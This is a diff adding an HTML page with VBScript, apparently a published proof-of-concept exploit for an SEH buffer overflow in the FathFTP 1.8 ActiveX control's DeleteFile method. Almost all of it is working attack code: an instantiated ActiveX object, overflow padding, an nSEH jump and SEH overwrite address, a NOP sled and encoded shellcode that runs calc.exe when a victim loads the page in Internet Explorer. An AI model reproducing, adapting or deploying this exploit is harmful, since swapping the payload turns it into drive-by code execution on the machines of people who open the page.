@@ -1,0 +1,55 @@
+<html>
+<object classid='clsid:62A989CE-D39A-11D5-86F0-B9C370762176' id='target'></object>
+<script language='vbscript'>
+' Exploit Title: FathFTP 1.8 (SEH) DeleteFile ActiveX Buffer Overflow
+' Author: MadjiX
+' Software Link: http://www.fathsoft.com/fathftp.html
+' Version 1.7 : http://www.exploit-db.com/exploits/14269/ (Thanks Blake)
+' RasIsConnected 1.8 : http://www.exploit-db.com/exploits/14539/
+' Tested on: Windows XP SP3 FR / IE6
+' Visit : www.sec4ever.com
+'---------------------------------------------------'
+'                  _____ __                         '
+'____________________  // /_______   ______________ '
+'__  ___/  _ \  ___/  // /_  _ \_ | / /  _ \/  ___/ '
+'_(__  )/  __/ /__ /__  __/  __/_ |/ //  __/  /     '
+'/____/ \___/\___/   /_/  \___/_____/ \___//_/      '
+'                                                   '
+'                   Security Team Members           '
+'---------------------------------------------------'
+
+' EXITFUNC=seh CMD=calc.exe Size=338 Encoder=Alpha2
+shellcode = unescape("%eb%03%59%eb%05%e8%f8%ff%ff%ff%49%49%49%49%48%49") & _
+unescape("%49%49%49%49%49%49%49%49%49%49%49%49%51%5a%6a%68") & _
+unescape("%58%50%30%42%31%42%41%6b%41%41%78%32%41%42%32%42") & _
+unescape("%41%30%42%41%41%58%38%41%42%50%75%59%79%39%6c%4a") & _
+unescape("%48%50%44%63%30%35%50%43%30%4c%4b%57%35%77%4c%4c") & _
+unescape("%4b%51%6c%35%55%64%38%77%71%6a%4f%4c%4b%62%6f%45") & _
+unescape("%48%4e%6b%31%4f%45%70%55%51%6a%4b%73%79%6e%6b%70") & _
+unescape("%34%6c%4b%46%61%7a%4e%70%31%4b%70%4e%79%6e%4c%6c") & _
+unescape("%44%49%50%52%54%67%77%5a%61%59%5a%34%4d%55%51%6f") & _
+unescape("%32%4a%4b%79%64%37%4b%51%44%41%34%35%54%71%65%6d") & _
+unescape("%35%4e%6b%53%6f%47%54%65%51%4a%4b%31%76%4e%6b%46") & _
+unescape("%6c%30%4b%6e%6b%51%4f%75%4c%54%41%58%6b%4c%4b%77") & _
+unescape("%6c%6e%6b%66%61%58%6b%6d%59%33%6c%46%44%46%64%6a") & _
+unescape("%63%35%61%6b%70%71%74%6e%6b%63%70%54%70%6f%75%6f") & _
+unescape("%30%54%38%56%6c%4c%4b%61%50%36%6c%4e%6b%34%30%35") & _
+unescape("%4c%4c%6d%6e%6b%43%58%75%58%58%6b%54%49%4c%4b%4d") & _
+unescape("%50%6c%70%43%30%57%70%55%50%6e%6b%32%48%35%6c%71") & _
+unescape("%4f%67%41%6b%46%53%50%56%36%6b%39%48%78%4d%53%4f") & _
+unescape("%30%71%6b%32%70%33%58%4c%30%4d%5a%56%64%43%6f%52") & _
+unescape("%48%6a%38%4b%4e%4c%4a%66%6e%31%47%4b%4f%6b%57%61") & _
+unescape("%73%70%61%30%6c%71%73%64%6e%70%65%73%48%72%45%35") & _
+unescape("%50%68")
+
+nops = string(12, unescape("%90"))
+buff=String(1439, "A")
+nseh=unescape("%eb%06%90%90") 'tangiza 5fifa :D
+seh=unescape("%54%7A%01%10") 'universal
+buff2=String(8888, "C")
+
+exploit = buff + nseh + seh + nops + shellcode + buff2
+target.DeleteFile exploit
+
+</script>
+</html>
